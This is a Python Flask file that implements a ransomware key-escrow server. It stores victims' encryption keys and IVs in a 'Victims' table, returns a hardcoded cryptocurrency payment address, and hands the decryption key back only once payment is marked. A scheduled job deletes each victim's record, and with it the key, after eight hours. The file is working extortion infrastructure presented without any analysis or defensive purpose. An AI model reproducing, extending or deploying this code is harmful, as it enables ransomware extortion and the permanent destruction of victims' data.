import datetime
from flask import Flask, request, abort
from flask_sqlalchemy import SQLAlchemy
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from apscheduler.schedulers.background import BackgroundScheduler
import pytz


app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///user_data.db'
db = SQLAlchemy(app)
app.config['TIMEZONE'] = "America/Toronto"   # don't even start with me on opsec

limiter = Limiter(get_remote_address, app=app, default_limits=["100/day", "10/hour"])


class Victims(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(512), nullable=False)
    iv = db.Column(db.String(512), nullable=False)
    uid = db.Column(db.String(1000), nullable=False, unique=True)
    cryptoAddr = db.Column(db.String(5000), nullable=False)
    payment = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    expiration = db.Column(db.DateTime)

    def __init__(self, key, iv, uid, cryptoAddr):
        self.key = key
        self.iv = iv
        self.uid = uid
        self.cryptoAddr = cryptoAddr
        self.calculate_threshold_time()
        self.schedule_termination()

    def calculate_threshold_time(self):
        tz = pytz.timezone('America/Toronto')
        self.created_at = datetime.datetime.now(tz=tz)
        self.expiration = datetime.datetime.now(tz=tz) + datetime.timedelta(hours=8)

    def schedule_termination(self):
        schedular = BackgroundScheduler()
        schedular.add_job(self.terminate, 'date', run_date=self.expiration)
        schedular.start()

    def terminate(self):
        with app.app_context():
            with db.session.begin():
                db.session.delete(self)


@app.route('/stage1', methods=['POST'])
def AddMeat():
    key = request.form.get('key')
    iv = request.form.get('iv')
    uid = request.form.get('uid')
    generate_crypto_addr = r"888tNkZrPN6JsVgN5S9cQUiyoogDavup3H"

    if key and iv and uid:
        freshMeat = Victims(key=key, iv=iv, uid=uid, cryptoAddr=generate_crypto_addr)
        db.session.add(freshMeat)
        db.session.commit()
        return generate_crypto_addr
    return abort(400)


@app.route('/victims', methods=['POST'])
def CheckVictim():
    uid = request.form.get('uid')
    victim = Victims.query.filter_by(uid=uid).first()
    
    if victim is not None and victim.payment:
        return f"SUCCESS|{victim.key}|{victim.iv}"
    return "Failed"



if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

